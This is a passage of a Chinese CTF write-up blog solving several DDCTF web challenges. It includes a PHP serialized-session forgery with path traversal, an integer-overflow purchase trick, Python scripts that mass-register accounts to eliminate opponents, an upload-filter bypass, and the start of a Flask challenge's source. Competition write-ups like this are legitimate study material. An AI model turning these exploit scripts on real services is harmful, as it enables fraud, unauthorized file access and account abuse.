</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$ddctf = new Session();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$ddctf-&gt;index();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></span></span></code></pre></div><p>得到<code>key</code>之后构造ddctfid:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//nickname = %s
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a:4:{s:10:&#34;session_id&#34;;s:32:&#34;3f65fc339c032f85048e42f21fab4ef0&#34;;s:10:&#34;ip_address&#34;;s:14:&#34;211.137.22.191&#34;;s:10:&#34;user_agent&#34;;s:78:&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&#34;;s:9:&#34;user_data&#34;;s:0:&#34;&#34;;}&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($a);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Application</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> $path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;....//config/flag.txt&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;EzblrbNS&#39;</span>;
</span></span><span style="display:flex;"><span>$b[<span style="color:#e6db74">&#39;user_data&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Application</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$d <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($b);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>($d<span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($key<span style="color:#f92672">.</span>$d));
</span></span></code></pre></div><p>传参即可。</p>
<h2 id="大吉大利今晚吃鸡">大吉大利今晚吃鸡<a hidden class="anchor" aria-hidden="true" href="#大吉大利今晚吃鸡">#</a></h2>
<p>遇到买东西的题目首先思路就是改变价格，通过抓包发现价格可以往大改而不能往小改。可以利用整数溢出<code>0xffffffff+1</code>，传参进去就买到了。
然后要淘汰100个人，实际上要淘汰149个人。脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://117.51.147.155:5050&#39;</span>
</span></span><span style="display:flex;"><span>seq <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;register&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;login&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;balance&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;search_ticket&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;bill&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;buy&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;bill&#39;</span>,
</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#39;pay&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url_seg <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;register&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/register?name=</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&amp;password=11111111&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;login&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/login?name=</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&amp;password=11111111&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;balance&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/get_user_balance&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;search_ticket&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/search_ticket&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;bill&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/search_bill_info&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;buy&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/buy_ticket?ticket_price=4294967296&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;remove&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/remove_robot?id=</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&amp;ticket=</span><span style="color:#e6db74">{1}</span><span style="color:#e6db74">&#39;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;pay&#39;</span>:<span style="color:#e6db74">&#39;/ctf/api/pay_ticket?bill_id=</span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>victiom <span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#39;21cb23b38e33426812d68991dbb6ba68&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#39;6f89be1e66c9bd69bce99952aa009a96&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>: <span style="color:#e6db74">&#39;70e1b0196609646efd0aacea613943d6&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>: <span style="color:#e6db74">&#39;46f7f7e50b54a636f3aae60dd839590b&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>: <span style="color:#e6db74">&#39;395b9fb4fb0f3cf42a727d43536be457&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">···</span>
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">···</span>
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">147</span>: <span style="color:#e6db74">&#39;4cc522f84f11189d9737ab18fc22fcd0&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">148</span>: <span style="color:#e6db74">&#39;8f2675372aa0f2ecfee1aeeee3d814cd&#39;</span>,
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">149</span>: <span style="color:#e6db74">&#39;7544b9ee45ae6ae7066305d472077638&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register_login_get_ticket</span>():
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">global</span> victiom 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">global</span> session
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>      username <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>sample(string<span style="color:#f92672">.</span>letters, <span style="color:#ae81ff">19</span>)    
</span></span><span style="display:flex;"><span>      username1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(username)
</span></span><span style="display:flex;"><span>      register1 <span style="color:#f92672">=</span> url_seg[<span style="color:#e6db74">&#39;register&#39;</span>]<span style="color:#f92672">.</span>format(str(username1))
</span></span><span style="display:flex;"><span>      reg_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> register1
</span></span><span style="display:flex;"><span>      print reg_url
</span></span><span style="display:flex;"><span>      res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(reg_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u7528\u6237\u6ce8\u518c\u6210\u529f</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> res:
</span></span><span style="display:flex;"><span>          log_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;login&#39;</span>]<span style="color:#f92672">.</span>format(username1)
</span></span><span style="display:flex;"><span>          session<span style="color:#f92672">.</span>get(log_url)
</span></span><span style="display:flex;"><span>          buy_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;buy&#39;</span>]
</span></span><span style="display:flex;"><span>          res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(buy_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>          bill_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;bill&#39;</span>]
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(bill_url)
</span></span><span style="display:flex;"><span>          jsonn <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>          bill_id <span style="color:#f92672">=</span> jsonn[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;bill_id&#39;</span>]
</span></span><span style="display:flex;"><span>          pay_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;pay&#39;</span>]<span style="color:#f92672">.</span>format(bill_id)
</span></span><span style="display:flex;"><span>          session<span style="color:#f92672">.</span>get(pay_url)
</span></span><span style="display:flex;"><span>          sear_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;search_ticket&#39;</span>]
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(sear_url)
</span></span><span style="display:flex;"><span>          res <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>          josnn <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>          id <span style="color:#f92672">=</span> josnn[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;id&#39;</span>]
</span></span><span style="display:flex;"><span>          <span style="color:#75715e"># 这个地方有点奇怪，josn解析不出ticket所以采用正则匹配的方式</span>
</span></span><span style="display:flex;"><span>          ticket <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;ticket</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">(.*?)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, res)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>          victiom[id] <span style="color:#f92672">=</span> ticket
</span></span><span style="display:flex;"><span>          print victiom
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> len(victiom) <span style="color:#f92672">==</span> <span style="color:#ae81ff">149</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_other</span>():
</span></span><span style="display:flex;"><span>  session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>  regiter1  <span style="color:#f92672">=</span> url_seg[<span style="color:#e6db74">&#39;register&#39;</span>]<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;ch5ser_cqw_cq&#39;</span>)
</span></span><span style="display:flex;"><span>  reg_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> regiter1
</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(reg_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\u7528\u6237\u6ce8\u518c\u6210\u529f</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> res:
</span></span><span style="display:flex;"><span>          log_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;login&#39;</span>]<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#39;ch5ser_cqw_cq&#39;</span>)
</span></span><span style="display:flex;"><span>          session<span style="color:#f92672">.</span>get(log_url)
</span></span><span style="display:flex;"><span>          buy_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;buy&#39;</span>]
</span></span><span style="display:flex;"><span>          res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(buy_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>          bill_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;bill&#39;</span>]
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(bill_url)
</span></span><span style="display:flex;"><span>          jsonn <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>          bill_id <span style="color:#f92672">=</span> jsonn[<span style="color:#e6db74">&#39;data&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;bill_id&#39;</span>]
</span></span><span style="display:flex;"><span>          pay_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;pay&#39;</span>]<span style="color:#f92672">.</span>format(bill_id)
</span></span><span style="display:flex;"><span>          session<span style="color:#f92672">.</span>get(pay_url)
</span></span><span style="display:flex;"><span>          sear_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> url_seg[<span style="color:#e6db74">&#39;search_ticket&#39;</span>]
</span></span><span style="display:flex;"><span>          html <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(sear_url)
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> victiom<span style="color:#f92672">.</span>items():    
</span></span><span style="display:flex;"><span>              remove <span style="color:#f92672">=</span> url_seg[<span style="color:#e6db74">&#39;remove&#39;</span>]<span style="color:#f92672">.</span>format(str(key), value)
</span></span><span style="display:flex;"><span>              rem_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> remove
</span></span><span style="display:flex;"><span>              print session<span style="color:#f92672">.</span>get(rem_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/get_flag&#34;</span>)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 注册过快可能会被封</span>
</span></span><span style="display:flex;"><span>  register_login_get_ticket()
</span></span><span style="display:flex;"><span>  delete_other()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>  main()
</span></span></code></pre></div><p>学长的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reg</span>():
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1000</span>):
</span></span><span style="display:flex;"><span>      url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/register?name=cic&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;password=12345678&#34;</span>
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>      print(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_ticket</span>(i):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>      s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/login?name=cic&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;password=12345678&#34;</span>)
</span></span><span style="display:flex;"><span>      html <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&#34;</span>)
</span></span><span style="display:flex;"><span>      json1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>      ticketid <span style="color:#f92672">=</span> json1[<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;bill_id&#34;</span>]
</span></span><span style="display:flex;"><span>      html1 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#34;</span><span style="color:#f92672">+</span>ticketid)
</span></span><span style="display:flex;"><span>      html2 <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/search_ticket&#34;</span>)
</span></span><span style="display:flex;"><span>      json2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(html2<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>      id <span style="color:#f92672">=</span> json2[<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;id&#34;</span>]
</span></span><span style="display:flex;"><span>      ticket <span style="color:#f92672">=</span> json2[<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;ticket&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      pack <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;id&#34;</span>:id , <span style="color:#e6db74">&#34;ticket&#34;</span>:ticket}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> pack
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">del_people</span>(id,ticket):
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/login?name=cic&amp;password=12345678&#34;</span>)
</span></span><span style="display:flex;"><span>  html <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://117.51.147.155:5050/ctf/api/remove_robot?id=&#34;</span><span style="color:#f92672">+</span>str(id)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&amp;ticket=&#34;</span><span style="color:#f92672">+</span>ticket)
</span></span><span style="display:flex;"><span>  print(html<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>  reg()
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#get_ticket()</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1000</span>):
</span></span><span style="display:flex;"><span>      pack <span style="color:#f92672">=</span> get_ticket(i)
</span></span><span style="display:flex;"><span>      id <span style="color:#f92672">=</span> pack[<span style="color:#e6db74">&#34;id&#34;</span>]
</span></span><span style="display:flex;"><span>      ticket <span style="color:#f92672">=</span> pack[<span style="color:#e6db74">&#34;ticket&#34;</span>]
</span></span><span style="display:flex;"><span>      print(id)
</span></span><span style="display:flex;"><span>      print(ticket)
</span></span><span style="display:flex;"><span>      del_people(id, ticket)
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">#del_people(id,ticket)</span>
</span></span></code></pre></div><h2 id="滴">滴<a hidden class="anchor" aria-hidden="true" href="#滴">#</a></h2>
<p>沙雕题目，要读取的文件<code>.practice.txt.swp</code>在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了</p>
<h2 id="图片上传">图片上传<a hidden class="anchor" aria-hidden="true" href="#图片上传">#</a></h2>
<p>上传一张图片，提示缺少字段<code>phpinfo()</code>,并显示出了上传后的图片，下载后放入<code>010editor</code>中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加<code>phpinfo()</code>上传就有flag了。</p>
<h2 id="homebrew-event-loop">homebrew event loop<a hidden class="anchor" aria-hidden="true" href="#homebrew-event-loop">#</a></h2>
<p>read the source code first</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- encoding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># written in python 3.7</span>
</span></span><span style="display:flex;"><span>__author__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;garzon&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session, request, Response
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*********************&#39;</span> <span style="color:#75715e"># censored</span>
</span></span><span style="display:flex;"><span>url_prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/d5af31f66741e857&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FLAG</span>():
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;FLAG_is_here_but_i_wont_show_you&#39;</span>  <span style="color:#75715e"># censored</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># put event in a queue</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_event</span>(event):
</span></span><span style="display:flex;"><span>  session[<span style="color:#e6db74">&#39;log&#39;</span>]<span style="color:#f92672">.</span>append(event)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> len(session[<span style="color:#e6db74">&#39;log&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5</span>: session[<span style="color:#e6db74">&#39;log&#39;</span>] <span style="color:#f92672">=</span> session[<span style="color:#e6db74">&#39;log&#39;</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>:]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> type(event) <span style="color:#f92672">==</span> type([]):
</span></span><span style="display:flex;"><span>      request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">+=</span> event
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>      request<span style="color:#f92672">.</span>event_queue<span style="color:#f92672">.</span>append(event)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the string between prefix and postfix</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_mid_str</span>(haystack, prefix, postfix<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>  haystack <span style="color:#f92672">=</span> haystack[haystack<span style="color:#f92672">.</span>find(prefix)<span style="color:#f92672">+</span>len(prefix):]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> postfix <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>      haystack <span style="color:#f92672">=</span> haystack[:haystack<span style="color:#f92672">.</span>find(postfix)]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> haystack
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RollBackException</span>: <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">execute_event_loop</span>():
</span></span><span style="display:flex;"><span>  valid_event_chars <span style="color:#f92672">=</span> set(<span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;</span>)
</span></span><span style="display:flex;"><span>  resp <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># handle a event everytime</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> len(request<span style="color:#f92672">.</span>event_queue) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>      event <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>event_queue[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># `event` is something like &#34;action:ACTION;ARGS0#ARGS1#ARGS2......&#34;</span>
</span></span><span style="display:flex;"><span>      request<span style="color:#f92672">.</span>event_queue <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>event_queue[<span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> event<span style="color:#f92672">.</span>startswith((<span style="color:#e6db74">&#39;action:&#39;</span>, <span style="color:#e6db74">&#39;func:&#39;</span>)): <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> event:
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> c <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> valid_event_chars: <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>          is_action <span style="color:#f92672">=</span> event[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span>
</span></span><span style="display:flex;"><span>          action <span style="color:#f92672">=</span> get_mid_str(event, <span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>)
</span></span><span style="display:flex;"><span>          args <span style="color:#f92672">=</span> get_mid_str(event, action<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;;&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;#&#39;</span>)
